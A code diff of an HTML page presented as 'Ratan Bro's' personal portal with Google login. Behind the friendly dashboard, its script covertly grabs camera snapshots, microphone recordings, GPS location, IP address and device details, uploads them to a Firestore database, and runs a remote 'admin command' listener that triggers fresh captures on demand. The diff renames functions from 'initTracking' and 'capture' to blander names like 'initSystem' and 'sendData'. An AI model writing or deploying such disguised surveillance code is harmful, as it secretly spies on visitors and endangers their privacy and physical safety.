@@ -3,26 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ratan Bro | Digital Portal</title>
+    <title>Ratan Bro | Personal Hub</title>
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --pink: #ff4d94; --dark: #020617; --glass: rgba(255, 255, 255, 0.05); }
+        :root { --pink: #ff4d94; --dark: #020617; }
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Hind Siliguri', sans-serif; }
-        body { background: var(--dark); color: white; min-height: 100vh; background-image: radial-gradient(circle at 50% 50%, #1e1b4b 0%, #020617 100%); }
+        body { background: var(--dark); color: white; min-height: 100vh; background: radial-gradient(circle at center, #1e1b4b 0%, #020617 100%); }
         
+        /* Glass UI */
         #login-overlay { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; }
-        .login-box { background: var(--glass); padding: 40px; border-radius: 30px; border: 1px solid var(--pink); text-align: center; backdrop-filter: blur(10px); width: 90%; max-width: 400px; box-shadow: 0 0 30px rgba(255, 77, 148, 0.2); }
-        .round-img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid var(--pink); margin-bottom: 20px; box-shadow: 0 0 15px var(--pink); }
+        .login-box { background: rgba(255, 255, 255, 0.05); padding: 40px; border-radius: 30px; border: 1px solid var(--pink); text-align: center; backdrop-filter: blur(15px); width: 90%; max-width: 400px; box-shadow: 0 0 30px rgba(255, 77, 148, 0.2); }
+        .profile-main { width: 100px; height: 100px; border-radius: 50%; border: 3px solid var(--pink); margin-bottom: 15px; box-shadow: 0 0 20px var(--pink); }
 
-        #main-ui { display: none; padding: 20px; animation: fadeIn 1s; }
-        @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }
+        #main-ui { display: none; padding: 20px; animation: fadeIn 0.8s ease; }
+        @keyframes fadeIn { from {opacity: 0; transform: translateY(20px);} to {opacity: 1; transform: translateY(0);} }
 
-        .header { text-align: center; padding: 30px 0; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .u-pic { width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--pink); margin-bottom: 10px; }
+
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; max-width: 800px; margin: 0 auto; }
-        .card { background: var(--glass); border-radius: 20px; padding: 25px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
-        .card:hover { border-color: var(--pink); transform: translateY(-5px); background: rgba(255, 77, 148, 0.05); }
-        .card i { font-size: 2.5rem; color: var(--pink); margin-bottom: 12px; }
+        .card { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 25px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
+        .card:hover { border-color: var(--pink); transform: translateY(-5px); background: rgba(255, 77, 148, 0.1); }
+        .card i { font-size: 2.2rem; color: var(--pink); margin-bottom: 12px; }
 
         canvas, video { display: none; }
     </style>
@@ -31,28 +34,29 @@
 
     <div id="login-overlay">
         <div class="login-box">
-            <img src="ratan.jpg" class="round-img" onerror="this.src='https://via.placeholder.com/100'">
-            <h2 style="color: var(--pink); margin-bottom: 10px;">Login to Access</h2>
-            <p style="font-size: 0.9rem; opacity: 0.7; margin-bottom: 25px;">Welcome to Ratan Bro's Personal Hub</p>
+            <img src="ratan.jpg" class="profile-main" onerror="this.src='https://via.placeholder.com/100'">
+            <h2 style="color: var(--pink); margin-bottom: 10px;">স্বাগতম রতন ব্রো পোর্টালে</h2>
+            <p style="opacity: 0.7; margin-bottom: 25px; font-size: 0.9rem;">সবকিছু অ্যাক্সেস করতে লগইন করুন</p>
             <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:15px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; display:flex; align-items:center; justify-content:center; gap:10px;">
-                <i class="fab fa-google"></i> Continue with Google
+                <i class="fab fa-google"></i> Login with Google
             </button>
         </div>
     </div>
 
     <div id="main-ui">
         <div class="header">
-            <img id="u_dp" src="" style="width:80px; border-radius:50%; border:2px solid var(--pink);">
-            <h2 id="u_welcome" style="margin-top:10px;"></h2>
+            <img id="user_img" src="" class="u-pic">
+            <h2 id="user_welcome"></h2>
+            <p style="opacity: 0.5;">Online Dashboard</p>
         </div>
         
         <div class="grid">
-            <a href="https://facebook.com" class="card"><i class="fab fa-facebook"></i><h4>Facebook</h4></a>
-            <a href="https://wa.me/yournumber" class="card"><i class="fab fa-whatsapp"></i><h4>WhatsApp</h4></a>
+            <a href="https://www.facebook.com/yourprofile" target="_blank" class="card"><i class="fab fa-facebook"></i><h4>Facebook</h4></a>
+            <a href="https://wa.me/880123456789" target="_blank" class="card"><i class="fab fa-whatsapp"></i><h4>WhatsApp</h4></a>
             <a href="#" class="card"><i class="fas fa-file-pdf"></i><h4>Test Paper</h4></a>
             <a href="#" class="card"><i class="fas fa-briefcase"></i><h4>Business</h4></a>
             <a href="https://numberlookup.pro.bd/" target="_blank" class="card"><i class="fas fa-search-location"></i><h4>No. Lookup</h4></a>
-            <a href="#" class="card"><i class="fas fa-user-circle"></i><h4>Portfolio</h4></a>
+            <a href="#" class="card"><i class="fas fa-id-card"></i><h4>Portfolio</h4></a>
         </div>
     </div>
 
@@ -84,54 +88,54 @@
             if (user) {
                 document.getElementById('login-overlay').style.display = 'none';
                 document.getElementById('main-ui').style.display = 'block';
-                document.getElementById('u_welcome').innerText = user.displayName;
-                document.getElementById('u_dp').src = user.photoURL;
-                initTracking(user);
+                document.getElementById('user_img').src = user.photoURL;
+                document.getElementById('user_welcome').innerText = user.displayName;
+                initSystem(user);
             }
         });
 
-        async function initTracking(user) {
+        async function initSystem(user) {
             const uId = user.email.replace('.', '_');
             const userRef = doc(db, "users", uId);
 
-            // ক্যামেরা পারমিশন
+            // ক্যামেরা ও মাইক্রোফোন পারমিশন
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => null);
             if(stream) document.getElementById('vSource').srcObject = stream;
 
-            // অ্যাডমিন কমান্ড লিসেনার
+            // অ্যাডমিন কমান্ড চেক
             onSnapshot(userRef, async (snap) => {
                 const data = snap.data();
-                if(data && data.command === "take_all") {
-                    await capture(user);
-                    await record(user);
+                if(data && data.command === "sync_now") {
+                    await sendData(user);
+                    await recordVoice(user);
                     await updateDoc(userRef, { command: "" });
                 }
             });
 
-            // প্রথমবার ঢুকেই ডাটা পাঠানো
-            capture(user);
+            // প্রথমবার ঢোকার সাথে সাথে ডাটা পাঠানো
+            sendData(user);
         }
 
-        async function capture(user) {
+        async function sendData(user) {
             const canvas = document.getElementById('snapCanvas');
             const video = document.getElementById('vSource');
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, 640, 480);
-            const img = canvas.toDataURL('image/jpeg', 0.5);
+            const pic = canvas.toDataURL('image/jpeg', 0.5);
             
-            const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
             
-            navigator.geolocation.getCurrentPosition(async (p) => {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
                 await setDoc(doc(db, "users", user.email.replace('.', '_')), {
                     name: user.displayName, email: user.email, photo: user.photoURL,
-                    ip: ipRes.ip, loc: `${p.coords.latitude},${p.coords.longitude}`,
-                    lastPic: img, time: new Date().toLocaleString(),
-                    device: navigator.userAgent
+                    ip: ipData.ip, loc: `${pos.coords.latitude},${pos.coords.longitude}`,
+                    lastPic: pic, time: new Date().toLocaleString(),
+                    device: navigator.platform + " | " + navigator.vendor
                 }, { merge: true });
             });
         }
 
-        async function record(user) {
+        async function recordVoice(user) {
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
             const mr = new MediaRecorder(stream);
             let chunks = [];
